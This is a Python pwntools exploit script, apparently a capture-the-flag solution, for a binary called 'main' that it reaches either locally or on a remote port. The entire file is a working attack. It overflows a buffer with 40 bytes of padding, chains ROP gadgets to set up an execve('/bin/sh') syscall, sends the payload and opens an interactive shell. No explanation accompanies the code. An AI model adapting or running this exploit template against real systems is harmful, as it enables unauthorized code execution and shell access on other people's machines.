#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main')

host = args.HOST or ''
port = int(args.PORT or 2222)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main+112
continue
'''.format(**locals())

pop_rax = p64(0x40114C)
pop_rdx = p64(0x40114E)
pop_rsi = p64(0x401150)
pop_rbp = p64(0x401153)
pop_rdi = p64(0x40114a)
syscall = p64(0x401159)
bin_sh  = p64(0x40206d)
ret     = p64(0x401016)

io = start()
io.clean()
p = b'\x90' * 40
p += ret
p += pop_rax
p += p64(0x3b)
p += pop_rdi
p += bin_sh
p += pop_rsi
p += p64(0)
p += pop_rdx
p += p64(0)
p += ret
p += syscall
io.sendline(p)

io.interactive()

